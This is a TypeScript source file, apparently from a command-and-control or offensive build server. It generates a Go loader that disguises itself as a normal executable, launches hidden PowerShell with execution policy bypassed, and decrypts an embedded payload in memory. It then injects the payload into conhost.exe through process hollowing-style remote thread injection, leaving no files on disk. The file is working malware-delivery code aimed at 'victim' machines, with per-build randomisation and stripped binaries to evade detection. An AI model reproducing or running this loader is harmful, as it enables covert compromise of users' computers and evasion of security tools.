/**
 * exe-wrapper.ts — Wraps a compiled PE binary in a Go-based LOLBAS loader
 * that injects the agent into conhost.exe entirely in-memory.
 * No files are written to disk on the victim machine.
 *
 * Two-stage build:
 *   1. Build server compiles agent → PE bytes
 *   2. Encrypt PE (XOR + gzip) → embed in Go loader as payload.dat
 *   3. Compile Go loader → final .exe (replaces raw agent PE)
 *
 * Execution chain on victim:
 *   1. User runs the .exe (looks like any normal executable)
 *   2. Go loader reads embedded encrypted payload from itself
 *   3. Base64-encodes payload, pipes full PS script via stdin to hidden PowerShell
 *   4. PS decrypts XOR+gzip payload from piped base64 in memory
 *   5. C# P/Invoke injector compiled via Add-Type (random class name per build)
 *   6. conhost.exe started hidden (LOTL — Console Window Host, always present)
 *   7. PE manually mapped into conhost via VirtualAllocEx + WriteProcessMemory
 *   8. Relocations + imports resolved remotely
 *   9. CreateRemoteThread at PE entry point
 *  10. Go loader exits, agent runs inside conhost.exe — no files on disk
 */

import fs from "fs";
import path from "path";
import { $ } from "bun";
import {
  encryptPayload,
  randClassName,
  randHex,
  buildCSharpInjector,
  buildPsInjectionChain,
} from "./pe-injector";

/**
 * Build the Go loader source code that embeds the encrypted PE and pipes
 * the full PS injection script to PowerShell via stdin (no env var size limits).
 *
 * The C# source (base64, ~7KB) is safe as a Go string constant.
 * The injection chain (~700 bytes) is safe as a Go string constant.
 * The payload (potentially MB+) is base64-encoded at runtime from the
 * embedded bytes and written to stdin — never touches an env var.
 */
function buildGoSource(csB64: string, psChain: string): string {
  // Escape backslashes and double quotes in the PS chain for Go string literal
  const chainEscaped = psChain.replace(/\\/g, "\\\\").replace(/"/g, '\\"');

  return `package main

import (
	_ "embed"
	"encoding/base64"
	"os"
	"os/exec"
	"syscall"
)

//go:embed payload.dat
var ep []byte

const csB64 = "${csB64}"

const psChain = "${chainEscaped}"

func main() {
	cmd := exec.Command(
		os.Getenv("SYSTEMROOT")+"\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
		"-nop", "-w", "h", "-ep", "b", "-",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		return
	}
	if err := cmd.Start(); err != nil {
		return
	}
	// Pipe PS script to stdin in parts — payload via base64 at runtime (no env var limit)
	b64 := base64.StdEncoding.EncodeToString(ep)
	stdin.Write([]byte("$d=[Convert]::FromBase64String('"))
	stdin.Write([]byte(b64))
	stdin.Write([]byte("');"))
	stdin.Write([]byte("$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"))
	stdin.Write([]byte(csB64))
	stdin.Write([]byte("'));"))
	stdin.Write([]byte(psChain))
	stdin.Close()
	cmd.Wait()
}
`;
}

/**
 * Wraps a compiled PE binary into a Go-based LOLBAS loader .exe that injects
 * the agent into conhost.exe entirely in-memory.
 *
 * @param peBytes    The raw PE binary (agent EXE) bytes
 * @param outPath    Where to write the resulting loader .exe
 * @param goArch     Target architecture (amd64, 386, arm64)
 * @param workDir    Parent directory for temp build files
 */
export async function wrapPeAsLoaderExe(
  peBytes: Buffer,
  outPath: string,
  goArch: string,
  workDir: string,
): Promise<void> {
  const tmpDir = path.join(workDir, `_exe_loader_${randHex(8)}`);
  fs.mkdirSync(tmpDir, { recursive: true });

  try {
    // 1. Encrypt + compress PE payload
    const encrypted = encryptPayload(peBytes);
    fs.writeFileSync(path.join(tmpDir, "payload.dat"), encrypted);

    // 2. Build C# injector (random class name per build)
    const className = randClassName();
    const csharpCode = buildCSharpInjector(className);
    const csB64 = Buffer.from(csharpCode, "utf-8").toString("base64");

    // 3. Build PowerShell injection chain (just the decrypt+inject part)
    const chain = buildPsInjectionChain("$d", "$cs", className, "conhost.exe");

    // 4. Generate Go source — pipes payload+C#+chain to PS stdin
    const goSource = buildGoSource(csB64, chain);
    fs.writeFileSync(path.join(tmpDir, "main.go"), goSource);
    fs.writeFileSync(path.join(tmpDir, "go.mod"), "module loader\n\ngo 1.21\n");

    // 5. Compile loader
    const buildEnv: Record<string, string> = {
      ...Object.fromEntries(
        Object.entries(process.env).filter(([, v]) => v !== undefined) as [string, string][],
      ),
      GOOS: "windows",
      GOARCH: goArch,
      CGO_ENABLED: "0",
    };

    const result = await $`go build -trimpath -ldflags "-s -w" -o ${outPath} .`
      .env(buildEnv)
      .cwd(tmpDir)
      .nothrow()
      .quiet();

    if (result.exitCode !== 0) {
      const stderr = result.stderr.toString().trim();
      throw new Error(`Go loader build failed (exit ${result.exitCode}): ${stderr}`);
    }
  } finally {
    // Cleanup temp directory
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}
